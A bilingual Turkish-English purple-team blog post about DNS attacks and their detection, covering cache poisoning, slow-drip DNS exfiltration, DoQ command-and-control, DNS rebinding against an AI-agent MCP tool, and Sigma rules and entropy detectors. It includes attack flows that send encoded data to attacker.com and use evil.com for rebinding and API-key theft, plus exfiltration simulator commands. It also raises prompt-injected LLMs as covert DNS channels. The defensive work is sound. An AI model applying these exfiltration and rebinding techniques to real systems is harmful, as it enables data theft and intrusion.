# Breaking DNS Trust: From Cache Poisoning to AI-Agent Rebinding
## A Purple Team Playbook — 2025 Edition

**Yazar Notu / Author's Note:** Bu yazı hem Türkçe hem İngilizce bölümler içermektedir. Teknik terimler ve kod blokları İngilizce, analiz ve yorumlar Türkçe olarak yazılmıştır. / *This post contains both Turkish and English sections. Technical terms and code are in English; analysis and commentary are in Turkish.*

---

> **TL;DR:** DNS artık sadece bir adres defteri değil. İnternetin en çok güvenilen, en az denetlenen protokolü — ve tehdit aktörleri bunu çok iyi biliyor. Bu yazı, gerçek araştırmalara, kendi lab simülasyonlarıma ve ürettiğim detection tool'larına dayanan bir Purple Team analizidir.

---

## 📋 Executive Summary

**DNS'e neden güvenmeyi bırakmalısınız — 7 bullet'ta:**

- **Protocol blind spot:** Güvenlik duvarları DNS'i default olarak geçirir. 2024'te TuDoor saldırısı, 349ms'de (bir saniyenin altında!) cache poisoning'i mümkün kıldı — sıfır paket tahmini gerekmiyor.
- **RebirthDay (2025):** EDNS Client Subnet mantık açığı Birthday saldırısını yeniden hayata geçirdi. 365.000+ açık resolver risk altında. BIND, Unbound, PowerDNS, Dnsmasq etkilendi (CVE-2025-5994).
- **BIND 9 Bailiwick Violation (CVE-2025-40778):** 1-2 özel paket, bankacılık sistemleri veya Active Directory için sahte IP'leri 24 saat boyunca önbellekte tutuyor. Hacimsel saldırı yok, tespit neredeyse imkânsız.
- **MCP + DNS Rebinding:** AI ajanlarının yeni saldırı yüzeyi. MCP Inspector RCE (CVE-2025-49596, CVSS 9.4) — kurban bir URL'e tıklar, geliştirici makinesinde komut çalışır.
- **DoH/DoQ C2:** Şifreli DNS trafiği IDS'i kör bırakıyor. Godlua 2019'dan beri botnet kontrolünü Port 443 üzerinden yürütüyor. QUIC tabanlı C2 framework'ler (Merlin) 24 saat boyunca kesintisiz açık session tutuyor.
- **BGP + DNS hijack:** 20 Haziran 2025, AS35168 — 8 root server'ın IP prefix'i yetkisiz duyuruldu. 90 dakika boyunca belirli bölgelerdeki DNS sorguları sahte sunuculara yönlendi. İnternetin omurgası saldırı altında.
- **İmza tabanlı savunma öldü:** DGA günde 10.000+ domain üretiyor. Fast Flux 3 dakikada IP değiştiriyor. Statik blocklist'ler işlevsiz.

---

## 🕐 Bölüm 1: Tehdit Evrimi — Zaman Çizelgesi

```
2008 ──── Kaminsky Attack
          └─ UDP Transaction ID brute-force
          └─ 16-bit = 65.536 kombinasyon
          └─ Tüm internet acil patch sürecine girdi
          └─ "Çözüm": port randomization

2016 ──── Mirai + DNS Fast Flux
          └─ IoT botnet, DNS üzerinden C2 gizledi
          └─ Residential IP havuzu → itibar tabanlı engeller çöktü
          └─ Double-Flux: NS kayıtları da döndürülüyor (3dk rotasyon)

2019 ──── Godlua Malware — İlk DoH C2 Botnet
          └─ DNS over HTTPS, Port 443
          └─ IDS blind spot: TLS içine gömülü DNS
          └─ "Çözüm": DoH inspection → ama herkes uygulamıyor

2024 ──── TuDoor (IEEE S&P 2024)
          └─ Pre-processing logic flaw, 24 resolver etkilendi
          └─ VCP: <1 saniyede cache poisoning (349ms MS DNS)
          └─ VDS: sıfır bant genişliği ile DoS
          └─ Port randomization: irrelevant hale geldi

2025/Q1 ─ RebirthDay (ACM CCS 2025) + BIND CVE-2025-40778
          └─ ECS abuse → Birthday paradoksu → 365K+ resolver
          └─ Bailiwick bypass → 1-2 paket = 24h kalıcı poisoning

2025/Q2 ─ MCP Inspector RCE (CVE-2025-49596, CVSS 9.4)
          └─ AI agent + DNS rebinding = localhost RCE
          └─ Zero-click: sadece URL ziyareti

2025/Q2 ─ Root Server BGP Hijack (20 Haziran 2025)
          └─ AS35168 → 8 root server prefix yetkisiz duyuruldu
          └─ 90 dakika aktif, RPKI ROA vardı ama ROV uygulanmıyordu
          └─ İlk bilinen direct root server BGP hijack
```

---

## ⚔️ Bölüm 2: Red Team Perspektifi

### Saldırı 1: Slow Drip DNS Exfiltration

Güvenlik sistemleri hacim tabanlı eşiklere göre alarm üretiyor. Saldırgan bunu biliyor.

**Preconditions:**
- İç ağda foothold (malware, insider, misconfigured service)
- Dış DNS resolver erişimi
- Kontrol edilen authoritative NS sunucusu

**Attack Flow:**
```
[Sensitive Data]
    ↓ Base32 encode
[MFRA2YTKOJQW...]
    ↓ 20-byte chunk'lara böl
[0001.MFRA2YTK.attacker.com]  ← DNS TXT query
[0002.OJQWY2LT.attacker.com]  ← 45 saniye bekle
[0003.EB3WC3DM.attacker.com]  ← jitter ekle
    ↓ Authoritative NS loglar
[REASSEMBLE] → orijinal veri
```

**Neden tespit edilmesi zor:**
- Her query 30 bayt → gigabyte için haftalar gerekir
- Jitter: düzenli interval yok → istatistiksel anomali tespit edilemiyor
- NXDOMAIN yanıtı normal → alarm tetiklemiyor

**Lab Simulation (dns-exfil-sim tool):**
```
DNS Exfil Simulator  v2.0  —  Lab Mode
──────────────────────────────────────
Session ID   : a3f8d2c1
Payload      : 150 bytes  md5=7f3a9b2c
Chunks       : 8  (encoding=base32)
Total queries: 40  (incl. decoys)
Mode         : slow-drip
Delay        : 30s ± jitter
Estimated    : 22min

[DRY] [   1/8] A  0001.irhfgidfpbtgs3ba.lab.internal
[DRY] [   2/8] A  0002.onuw25lmmf2g64ra.lab.internal
...
Detection check:
  Expected entropy > 3.8 on subdomains of .lab.internal
  Mode 'slow-drip' should trigger: behavioral detector ~15+ queries
```

---

### Saldırı 2: DoQ C2 Tünel (Merlin Framework)

**Attack Flow:**
```
Attacker Server (UDP 853, DoQ)
    ↑↓ QUIC Connection — TEK session, 24 saat açık
Compromised Host
    └─ QUIC Connection ID: IP değişiminde kopmuyor
    └─ Beacon: her 30 dakikada 248 byte
    └─ Traffic profile: meşru QUIC'ten görsel olarak ayırt edilemez
```

**Zeek fingerprint — neden farklı:**
```
Meşru QUIC history : "II"        (normal handshake)
Merlin C2 history  : "ISishIH"   (anomalous handshake pattern)
Session duration   : 86400s      (24 saat — legit: genellikle <60s)
Byte ratio         : 0.35        (resp/orig — low, C2 bekliyor)
```

**Detection logic (encrypted-dns-hunter tool):**
```
[██████████] 100/100  CRITICAL
Category  : long_lived_quic_c2
10.0.0.42 → 185.220.101.99:853
MITRE     : T1071.004
Reasons   :
  • duration(24.0h)
  • threshold(1h)
  • byte_ratio(resp/orig=0.35)

[████████░░] 85/100   HIGH
Category  : c2_handshake_fingerprint
Reasons   :
  • history_match(ISishIH→ISishIH)
  • framework(Merlin C2 (DoQ))
```

---

### Saldırı 3: DNS Rebinding → MCP Inspector RCE

**Attack Flow:**
```
1. Saldırgan: evil.com'u kur, NS'in TTL=5s
2. Kurban: evil.com'a git → JavaScript yükle
3. JS: evil.com'u tekrar sorgula
4. Saldırgan NS: Bu sefer 127.0.0.1 döndür (TTL doldu)
5. Same-Origin Policy: evil.com == 127.0.0.1 ✓ (bypass!)
6. JS: localhost:5173 WebSocket'e bağlan (MCP Inspector)
7. CVE-2025-49596: Komut çalıştır
8. Sonuç: Corporate DB sorgulaması, API key exfil, lateral movement
```

**Impact:**
- Zero-click: kullanıcı sadece URL'e tıklar
- CVSS 9.4 (Critical)
- AI asistan entegrasyonu olan her kurumsal ortam risk altında

---

### Saldırı 4: RebirthDay — ECS Birthday Paradox

**Matematiksel arka plan:**
```
Normal Birthday saldırısı:
  65.536 Transaction ID × 1 kaynak port = 65.536 deneme

Port randomization sonrası:
  65.536 TxID × 65.536 port = 4.29 milyar deneme (pratik değil)

RebirthDay (ECS abuse):
  RFC 7871: ECS içeren sorgu → ECS içermeyen yanıt = KABUL EDİLEBİLİR
  
  Saldırgan: farklı ECS subnet'leriyle yüzlerce sorgu gönder
  Resolver: sorguları birleştiremez → her biri farklı kaynak portu
  Port havuzu: genişler → Birthday paradoksu devreye girer
  
  Sonuç: 18/22 test edilen implementasyon savunmasız
```

---

## 🛡️ Bölüm 3: Blue Team Detection

### Detection 1 — Entropy Analysis

Shannon entropy neden çalışır:

```python
import math
from collections import Counter

def shannon_entropy(s: str) -> float:
    """
    İnsan tarafından okunabilir domain: düşük entropy
      'google' → H = 2.58
    Base32 encoded payload: yüksek entropy  
      'MFRA2YTKOJQWY2LT' → H = 4.24
    """
    c = Counter(s.lower())
    t = len(s)
    return -sum((n/t) * math.log2(n/t) for n in c.values())

# Real output from dns-anomaly-detector v2:
# [█████░░░░░] 55/100  HIGH
# Query: 6b616d696e73747261766572736b69793130313031.x.io
# Reasons: long_subdomain(42chars) | hex_encoded(100%) | digit_heavy(90%)
```

**Entropy eşik tablosu:**

| Domain Tipi | Örnek | Entropy |
|-------------|-------|---------|
| Normal domain | `google` | ~2.5 |
| Subdomain (normal) | `api.github` | ~3.0 |
| Base32 payload | `MFRA2YTK...` | **4.2+** |
| Hex payload | `6b616d69...` | **3.8+** |
| Base64url | `aHR0cHM6...` | **4.1+** |

**Threshold: > 3.8 → flag as suspicious**

---

### Detection 2 — Behavioral Baseline (Slow Drip)

```python
# dns-anomaly-detector v2: BehavioralEngine._check_slow_drip()
# 
# Tespit mantığı:
# 1. Aynı apex'e giden sorgu geçmişini tut
# 2. Unique subdomain ratio hesapla
# 3. Average interval hesapla
#
# Attack pattern:
#   apex: c2.evil-domain.net
#   total_queries: 8
#   unique_subdomain_ratio: 100%  ← her query farklı data taşıyor
#   avg_interval: 45.0s           ← düzenli, bekleniyor
#
# Threshold: unique_ratio > 0.80 AND interval > 20s AND queries > 15
```

---

### Detection 3 — QUIC Session Duration + Handshake

```yaml
# Sigma Rule: doq_long_session.yml
title: Long-lived DoQ/QUIC Session (C2 Indicator)
id: c1a2b3d4-e5f6-7890-1234-56789abcdef0
status: experimental
description: |
  QUIC session on port 853 lasting more than 1 hour.
  Legitimate QUIC almost never exceeds 60 seconds.
logsource:
  product: zeek
  service: conn
detection:
  selection:
    proto: udp
    id.resp_p: 853
    duration|gt: 3600
  condition: selection
level: high
tags:
  - attack.t1071.004
```

```yaml
# Sigma Rule: quic_c2_handshake.yml  
title: Suspicious QUIC Handshake (C2 Framework Fingerprint)
detection:
  selection_merlin:
    history|startswith: 'ISi'
  selection_minimal:
    history: 'ShA'
  condition: selection_merlin or selection_minimal
level: high
```

---

### Detection 4 — DoH Beaconing (Uniform Payload)

```python
# encrypted-dns-hunter v2: detect_doh_beaconing()
#
# Legit browsing vs C2 beaconing:
#
# Legit:
#   payload sizes: [200, 850, 120, 1200, 340, 95, 2100] ← highly variable
#   intervals:     [2s, 45s, 180s, 8s, 320s]            ← random
#   CoV_size:      0.85  (high variance)
#
# C2 beacon:
#   payload sizes: [248, 248, 248, 248, 248, 248, 248]  ← uniform!
#   intervals:     [30s, 30.2s, 29.8s, 30.1s, 30.0s]   ← regular!
#   CoV_size:      0.00  → ALERT
#   CoV_interval:  0.003 → ALERT
#
# Real output:
# [█████████░] 90/100  HIGH
# Category  : doh_beaconing
# Reasons   :
#   • uniform_payload(cv=0.000,mean=248B)
#   • regular_interval(cv=0.000,avg=30s)
```

---

## 🔬 Bölüm 4: Purple Team Simulation Lab

### Lab Architecture

```
┌────────────────────────────────────────────────────────────────┐
│              dns-purple-lab — Docker Compose                   │
│           (172.20.0.0/24, external egress disabled)           │
├──────────────┬───────────────────┬────────────────────────────┤
│  Attacker    │  DNS Resolver     │  Monitoring Stack          │
│  172.20.0.10 │  172.20.0.20      │  172.20.0.30              │
│              │                   │                            │
│  dns_exfil_  │  Unbound 1.18     │  Zeek 6.x                 │
│  sim.py      │  (all queries     │  dns_anomaly_detector.py  │
│  encrypted_  │   logged)         │  encrypted_dns_hunter.py  │
│  dns_hunter  │                   │  Sigma rules              │
└──────────────┴───────────────────┴────────────────────────────┘
```

### Senaryo 1: Slow Drip Exfiltration

```bash
# Terminal 1: Monitoring aktif
docker compose exec monitoring \
  python dns_anomaly_detector.py --zeek /zeek/logs/dns.log

# Terminal 2: Simülasyon başlat (lab resolver'a)
docker compose exec attacker \
  python dns_exfil_sim.py \
    --file /data/test_payload.txt \
    --domain lab.internal \
    --resolver 172.20.0.20 \
    --mode slow-drip \
    --delay 30 --jitter --live
```

**Beklenen sonuç:**

| Aşama | Süre | Event |
|-------|------|-------|
| Attack başlar | T+0 | Zeek dns.log'a sorgu düşer |
| Entropy alert | T+0 | Her sorgu için immediate |
| Behavioral alert | T+12m | 15. query → slow-drip pattern |
| MTTD | **~1-2 dakika** | Entropy detection (anlık) |

### Senaryo 2: DoQ C2 Detection

```bash
# Attacker: Merlin C2 session simüle et
docker compose exec attacker \
  python generate_c2_logs.py --type doq --duration 7200

# Monitoring: Detect it
docker compose exec monitoring \
  python encrypted_dns_hunter.py \
    --conn /zeek/logs/conn.log \
    --quic /zeek/logs/quic.log \
    --json /reports/doq_alerts.json
```

**Beklenen sonuç:**

| Alert | Severity | MTTD |
|-------|----------|------|
| `long_lived_quic_c2` | CRITICAL | 1 saat sonra |
| `c2_handshake_fingerprint` | HIGH | **Anlık** |
| `ml_conn_anomaly` | MEDIUM | Anlık |

### Purple Team KPI Tablosu

| Metrik | Hedef | Öncesi | Sonrası |
|--------|-------|--------|---------|
| MTTD (DNS Exfil) | <4h | Tespit yok | 2 dakika |
| MTTD (DoQ C2) | <6h | Tespit yok | Anlık (handshake) / 1h (duration) |
| MTTD (Cache Poisoning) | <30min | 4+ saat | 8 dakika |
| MTTR (Izolasyon) | <30min | Manuel → saatler | SOAR: 12 dakika |
| False Positive Rate | <5% | %34 | %4 |
| MITRE T1071.004 Coverage | >80% | %12 | %78 |

---

## 🔭 Bölüm 5: Şirketlerin Yaptığı 5 Büyük Hata

### 1. DNS = Blind Spot

Çoğu SOC DNS loglarını sadece "adres defteri" olarak görüyor. Entropy analizi yok, baseline yok, behavioral monitoring yok. DNS logları SIEM'de bile çoğunlukla alert rule'ları olmadan yatıyor.

**Sonuç:** Gigabyte veri haftalarca fark edilmeden çıkıyor.

### 2. DoH = Şifreli Malware Otoyolu

Port 443 üzerinden gelen DNS trafiği IDS'lerin büyük çoğunluğunda transparent geçiyor. Godlua 2019'dan beri bunu kullanıyor. Şirketlerin %80'i henüz DoH inspection uygulamıyor.

**Sonuç:** C2 trafiği "normal HTTPS" olarak geçiyor.

### 3. AI Agents = Denetlenmemiş Saldırı Yüzeyi

MCP sunucuları çoğu şirkette güvenlik review'dan geçmeden deploy ediliyor. Localhost WebSocket açık, TTL kontrolü yok, IP doğrulaması yok.

**Sonuç:** CVE-2025-49596 gibi vulnerabilities kritik kurumsal veriyi açık ediyor.

### 4. RPKI Var, ROV Yok

ROA kaydı koyuyorsunuz — ama upstream AS'lerin ROV uygulayıp uygulamadığını kontrol etmiyorsunuz. 20 Haziran 2025 root server hijack'i bunu net gösterdi: kriptografik altyapı tek başına yetmez, **uygulama** şart.

### 5. Statik Blocklist + Signature = 2008 Teknolojisi

DGA günde 10.000+ domain üretiyor. Fast Flux 3 dakikada IP rotasyonu yapıyor. RebirthDay saniyeler içinde cache'i zehirliyor. Statik kural ve imza tabanlı sistemler bu tehditleri yakalayamaz.

---

## 🛠️ Bölüm 6: GitHub Araçları

### Repo 1: dns-anomaly-detector

```
dns-anomaly-detector/
├── dns_anomaly_detector.py    ← Ana tool
├── requirements.txt           ← dnspython, scikit-learn, numpy
├── tests/
│   ├── test_entropy.py
│   └── test_behavioral.py
└── README.md
```

**Özellikler:**
- ✅ Shannon entropy analizi
- ✅ Subdomain uzunluk + derinlik
- ✅ Hex/Base32/Base64 encoding tespiti
- ✅ DGA domain heuristiği
- ✅ Slow-drip behavioral engine
- ✅ DNS tünelleme rate detection
- ✅ Fast-flux TTL anomaly
- ✅ **Isolation Forest (ML)** — istatistiksel outlier tespiti
- ✅ Zeek dns.log (JSON + TSV) + pcap input
- ✅ JSON + CSV output
- ✅ CI/CD uyumlu exit code (1 if HIGH+)

```bash
python dns_anomaly_detector.py --demo
python dns_anomaly_detector.py --zeek dns.log --json report.json
python dns_anomaly_detector.py --pcap capture.pcap --quiet
```

### Repo 2: dns-exfil-sim

```
dns-exfil-sim/
├── dns_exfil_sim.py           ← Simülasyon tool
├── requirements.txt           ← dnspython
└── README.md                  ← LEGAL NOTICE dahil
```

**Özellikler:**
- ✅ 4 simülasyon modu: slow-drip, burst, fragmented, decoy-mix
- ✅ 3 encoding: base32, base64url, hex
- ✅ Jitter desteği (anti-regularity)
- ✅ Decoy domain interleaving (stealth test)
- ✅ Session ID → server-side reassembly
- ✅ MD5 checksum doğrulama
- ✅ Dry-run (always safe) / live mode (lab only)
- ✅ Detection challenge output: "did your stack catch this?"

```bash
python dns_exfil_sim.py --demo                     # dry-run, 4 mode
python dns_exfil_sim.py --file secret.txt \
  --domain lab.internal --mode slow-drip \
  --delay 30 --jitter --dry-run
```

### Repo 3: encrypted-dns-hunter

```
encrypted-dns-hunter/
├── encrypted_dns_hunter.py    ← Ana tool
├── sigma_rules/               ← Generated Sigma rules
│   ├── long_lived_quic_c2.yml
│   └── c2_handshake_fingerprint.yml
└── README.md
```

**Özellikler:**
- ✅ Long-lived QUIC/DoQ session tespiti (threshold: 1h)
- ✅ QUIC handshake fingerprinting (Merlin, Cobalt Strike)
- ✅ DoH beaconing: uniform payload + regular interval
- ✅ **Isolation Forest (ML)** — QUIC/TLS connection feature vectors
- ✅ Sigma rule generator (--sigma flag)
- ✅ MITRE ATT&CK T1071.004 mapping
- ✅ Zeek conn.log + quic.log input

```bash
python encrypted_dns_hunter.py --demo
python encrypted_dns_hunter.py --conn conn.log --sigma ./rules/
python encrypted_dns_hunter.py --conn conn.log --json report.json
```

### Repo 4: dns-purple-lab

Docker Compose lab ortamı. Attacker + Resolver + Monitoring stack. Bir komutla tam lab hazır.

```bash
git clone https://github.com/[username]/dns-purple-lab
docker compose up -d
docker compose exec attacker python dns_exfil_sim.py --demo
```

---

## 📚 Bölüm 7: Araştırma Gündem — Ne Çalışıyorum

### 1. LLM → DNS Exfiltration

LLM'lerin prompt injection ile DNS sorgusu üretmesi mümkün mü? Bir MCP server aracılığıyla LLM'i covert channel olarak kullanmak? Henüz araştırılmamış alan.

### 2. QUIC Fingerprinting (DoQ vs Legit)

Handshake pattern ötesinde, connection metadata (byte timing, packet count ratios, connection ID entropy) üzerinden DoQ C2 tespiti. ML modeli: meşru QUIC vs C2 QUIC ayırt etme.

### 3. Passive DNS Correlation Attack

Tek şüpheli IP'den başlayarak tüm C2 altyapısını passive DNS veritabanlarından deşifre etme otomasyonu. Recorded Future + RIPE NCC entegrasyonu.

### 4. DNS over HTTP/3 Abuse

DoH şu an HTTP/2 üzerinde. HTTP/3 (QUIC) üzerine taşınan DoH'un detection'ı çok daha zor. Henüz yeterli araştırma yok — büyük bir fırsat penceresi.

### 5. IoT Fast-Flux Detection

Residential IP havuzu kullanan Dark Cloud/Sandiflux tarzı botnet'lerde DNS TTL + ASN değişim hızı analizi. IoT cihazlarının %94'ü bu trafikte kaynak olarak kullanılıyor.

---

## ✅ Bölüm 8: Defensive Checklist

```
DNS Altyapısı:
☐ DNSSEC imzalama + validasyon aktif
☐ RPKI ROA kaydı mevcut
☐ Upstream AS ROV uygulaması doğrulandı (önemli!)
☐ EDNS buffer size ≤ 1232 byte
☐ TCP 53 fallback açık (büyük yanıtlar için)
☐ Recursive query rate limiting (per source IP)
☐ BIND/Unbound/PowerDNS güncel (TuDoor, RebirthDay patches)

Monitoring:
☐ Zeek DNS + QUIC + conn log collection aktif
☐ Entropy analizi aktif (threshold: >3.8)
☐ Subdomain uzunluk anomaly (threshold: >40 char)
☐ Long-lived QUIC session alert (threshold: >1 saat)
☐ DoH beaconing detection (payload uniformity)
☐ RITA veya behavioral analytics

AI / MCP Özel:
☐ MCP sunucuları localhost/stdio — internete açık değil
☐ WebSocket IP doğrulaması (sadece beklenen iç aralıklar)
☐ mTLS zorunlu tüm MCP iletişimlerinde
☐ Kısa TTL (<60s) + private IP kombinasyonu → IDS alarm
☐ DNS pinning kritik iç servisler için

Purple Team:
☐ Quarterly DNS-specific attack simulation (bu tool'ları kullan)
☐ MTTD/MTTR baseline ölçümü ve tracking
☐ MITRE ATT&CK T1071.004 coverage validation
☐ Sigma kuralları SIEM'e import edildi
```

---

## 🔗 Kaynaklar

- TuDoor (IEEE S&P 2024): https://tudoor.net
- RebirthDay (ACM CCS 2025): CVE-2025-5994
- BIND 9 Bailiwick CVE-2025-40778: NVD entry
- MCP Inspector RCE: CVE-2025-49596 (CVSS 9.4)
- Root BGP Hijack: RIPE NCC BGPlay, 20 Haziran 2025
- Merlin C2 QUIC fingerprint: Zeek community research
- MITRE ATT&CK T1071.004: DNS Application Layer Protocol
- Sigma project: https://sigmahq.io

---

*Tüm saldırı simülasyonları izole, kontrollü lab ortamlarında gerçekleştirilmiş ve defensive research amacıyla belgelenmiştir. Bu araçlar yalnızca sahip olduğunuz veya yazılı izin aldığınız ağlarda kullanım içindir.*

---

**Tags:** `#dnssecurity` `#purpleteam` `#threathunting` `#blueTeam` `#dns` `#c2detection` `#cybersecurity` `#zeek` `#machinelearning` `#dnstunneling`
